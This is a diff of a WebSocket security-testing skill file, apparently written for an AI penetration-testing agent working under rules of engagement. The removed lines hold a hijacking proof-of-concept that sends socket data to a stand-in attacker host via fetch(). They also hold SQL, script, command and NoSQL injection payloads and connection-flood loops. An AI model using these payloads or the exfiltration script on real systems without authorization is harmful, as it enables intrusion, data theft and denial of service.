@@ -1,138 +1,64 @@
 ---
 name: websocket-testing
-description: WebSocket security testing — injection, auth bypass, hijacking
+description: Test WebSocket endpoints for authentication bypass, injection, cross-site hijacking, and message manipulation
 origin: Vigil
 vuln_class: websocket
 ---
 
 # WebSocket Security Testing
 
-> **`vigil assess kali` audit flags:** use `--technique OTHER` for generic WebSocket protocol and CSWSH probing. Switch to the specific vuln class when the WS message carries a `SQLI`, `XSS`, `CMDI`, or `AUTH` payload.
-
 ## When to Activate
 
-- Application uses WebSocket connections (`ws://` or `wss://`)
-- Real-time features: chat, notifications, live updates, trading
-- `Upgrade: websocket` observed in HTTP traffic
+- `ws://`/`wss://` endpoints or `Upgrade: websocket` traffic: chat, notifications, live updates,
+  trading, collaborative editing. Find them in bundles with `rg "new WebSocket|\.connect\(.*ws"`
+  (`agent/skills/source-analysis/SKILL.md`).
 
-## Tools
+`--technique WEBSOCKET` for protocol, auth and CSWSH probing; the specific class (`SQLI`, `XSS`,
+`CMDI`, `IDOR`, `AUTH`) when a frame carries that payload. The runtime image ships no websocat;
+script the client in Python with the system `aiohttp` (`ClientSession().ws_connect(url,
+headers={…}, origin=…)`) and run it via `vigil assess kali exec --technique WEBSOCKET --intent
+"<purpose>" --probe-kind payload --phase consume-test --timeout 60 --identity-env A=user_a --
+python3 <script>` so the identity's `$VIGIL_COOKIE_A` is available to it
+(`agent/skills/write-probe-script/SKILL.md`). Browser-side behaviour: `vigil assess kali browser`.
 
-- `vigil assess kali exec -- websocat ...` (CLI WebSocket client — all target-facing WebSocket probing must go through the kali exec wrapper; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 60` for generic probing, switching to the specific vuln class for injection payloads)
-- Burp Suite (WebSocket history + Repeater — use to craft messages, then replay via kali exec for audit pipeline coverage)
-- Browser DevTools (Network → WS tab)
-- OWASP ZAP (WebSocket support)
-- Custom scripts (Python websockets library — run via `vigil assess kali exec -- python3 ...`)
+## Checks
 
-## Methodology
+1. **Handshake auth:** connect with no cookie or token, an expired one, and another user's; check
+   whether authorization is re-checked per message after the session expires or the role changes.
+2. **Authorization in frames:** other users' IDs, room/channel IDs and unauthorized subscriptions
+   (`{"subscribe":"admin-events"}`); the IDOR method is `agent/skills/idor-testing/SKILL.md`.
+   Open two connections as two owned identities and compare what each receives: broadcasts that
+   carry the other user's data are a leak even without any injection.
+3. **Injection in frame fields** with the class skills (SQLi, NoSQL, command injection, XSS). XSS
+   that renders to other users needs the side-effect preflight (`agent/shared-constraints.md`
+   §2d).
+4. **Message handling:** replay (nonce/sequence checks), out-of-order and binary tampering,
+   malformed JSON for verbose errors.
+5. **Resource limits** (many connections, message floods, oversized frames, idle timeouts) are
+   denial of service: one bounded probe within the ROE and operator approval
+   (`agent/shared-constraints.md` §1); never background connection loops.
 
-### 1. Discover and Map
+## Cross-Site WebSocket Hijacking (CSWSH)
 
-- [ ] Identify WebSocket endpoints in JavaScript source: `rg "new WebSocket|\.connect\(.*ws" --type js`
-- [ ] Check for `ws://` (unencrypted) vs `wss://` (TLS)
-- [ ] Connect and observe handshake:
-      ```bash
-      websocat -v wss://target.example/ws
-      # -v shows headers, handshake, and frames
-      ```
-- [ ] Map message types by sending and receiving:
-      ```bash
-      echo '{"type":"ping"}' | websocat wss://target.example/ws
-      ```
-- [ ] Document message flow: client→server and server→client
+The handshake carries cookies but no CSRF token, so Origin validation is the only defence; a
+hijacked socket is bidirectional and persistent (the attacker reads the stream and sends
+commands). What to check:
 
-### 2. Authentication Testing
+- Does the upgrade request carry cookies, and with which `SameSite`? Chromium withholds `Lax`
+  cookies from a cross-site handshake, so CSWSH needs `SameSite=None` cookies, a same-site
+  attacker origin (a subdomain you control), or a non-Chromium victim.
+- Is `Origin` validated on the handshake (send a foreign `Origin` from the script)?
+- Is a per-connection ticket required in the URL that the attacker page cannot obtain? That makes
+  CSWSH much harder even with a missing Origin check.
+- What flows over the socket (messages, transactions, tokens) and which commands it accepts?
 
-- [ ] Connect without token:
-      ```bash
-      websocat wss://target.example/ws
-      # If connection succeeds and receives data → missing auth
-      ```
-- [ ] Connect with modified/expired token:
-      ```bash
-      websocat -H "Cookie: session=invalid_token" wss://target.example/ws
-      websocat -H "Authorization: Bearer expired_jwt" wss://target.example/ws
-      ```
-- [ ] Test per-message auth: connect with valid token, then send privileged messages after token expires
-- [ ] Replay handshake with another user's cookies
-
-### 3. Authorization Testing
-
-- [ ] Send messages targeting other users' resources:
-      ```bash
-      echo '{"action":"get_profile","user_id":"OTHER_USER_ID"}' | websocat wss://target.example/ws
-      ```
-- [ ] Subscribe to unauthorized channels:
-      ```bash
-      echo '{"subscribe":"admin-events"}' | websocat wss://target.example/ws
-      ```
-- [ ] Modify user ID or room ID in messages
-- [ ] Test IDOR in WebSocket message parameters
-
-### 4. Injection Attacks
-
-- [ ] SQLi in message parameters:
-      ```bash
-      echo '{"search":"'\'' OR 1=1--"}' | websocat wss://target.example/ws
-      ```
-- [ ] XSS: `{"message":"<script>alert(document.domain)</script>"}` — check if rendered to other users
-- [ ] Command injection: `{"cmd":"test; id"}` in server-processed fields
-- [ ] NoSQL: `{"user":{"$ne":null}}` if backend uses MongoDB
-
-### 5. Cross-Site WebSocket Hijacking (CSWSH)
-
-- [ ] Check if Origin header is validated during handshake
-- [ ] Create PoC page on attacker domain:
-      ```javascript
-      var ws = new WebSocket('wss://target.example/ws');
-      ws.onmessage = function(e) {
-        fetch('https://attacker.example/log?d=' + btoa(e.data));
-      };
-      ```
-- [ ] Test if victim's cookies are sent with cross-origin WS handshake
-- [ ] Verify data exfiltration from victim's session
-
-### 6. Message Manipulation
-
-- [ ] Modify message content in transit (Burp intercept)
-- [ ] Replay previous messages — check for nonce/sequence validation
-- [ ] Send out-of-order messages
-- [ ] Send malformed/oversized messages — check error handling
-- [ ] Binary message tampering
-
-### 7. Denial of Service
-
-- [ ] Open many concurrent connections:
-      ```bash
-      for i in $(seq 1 100); do websocat wss://target.example/ws & done
-      # Check how many succeed before server rejects
-      ```
-- [ ] Send rapid messages:
-      ```bash
-      while true; do echo '{"ping":1}'; done | websocat wss://target.example/ws
-      ```
-- [ ] Send oversized message: `python3 -c "print('A'*1000000)" | websocat wss://target.example/ws`
-- [ ] Keep connections idle — test timeout enforcement
-
-### 8. Data Exposure
-
-- [ ] Monitor all incoming messages for sensitive data:
-      ```bash
-      websocat -H "Cookie: session=VALID" wss://target.example/ws | tee /engagements/$ENGAGEMENT_KEY/scans/ws_messages.log
-      # Review log for PII, tokens, internal IDs, other users' data
-      ```
-- [ ] Check if server broadcasts data meant for other users (open two connections with different users, compare received messages)
-- [ ] Check for verbose error messages: send malformed JSON, observe error detail level
+Proof: a PoC page on an attacker origin, loaded in a browser session of an owned victim identity,
+opens the socket and receives that identity's data or performs an action.
 
 ## What to Record
 
-- WebSocket endpoint URL and protocol
-- Authentication mechanism (or lack thereof)
-- Vulnerability type and proof payload
-- Data exposed or action performed — prove the attacker outcome (`agent/rules/hunting.md` §2), e.g., unauthenticated WebSocket connection returned real-time order data for all users, CSWSH PoC exfiltrated victim's session token and active trade positions to attacker server, SQLi payload in search message returned all usernames and email addresses from the database
-- CSWSH PoC if Origin not validated
-- Severity: Critical (data theft, RCE) to Medium (DoS, info leak)
-
-## Extended Resources
-
-- `agent/skills/source-analysis/SKILL.md` — for discovering WebSocket endpoints in JavaScript source
-- WebSocket testing methodology is otherwise self-contained
+Endpoint and protocol, the authentication mechanism, the vulnerability and proof frame, and the
+outcome (`agent/rules/hunting.md` §2): data received that belongs to another identity, an action
+performed through a hijacked socket, injection output. Severity:
+`agent/references/finding-fp-and-severity-gate.md`; format:
+`agent/references/runtime-guides/web-finding-recording.md`.
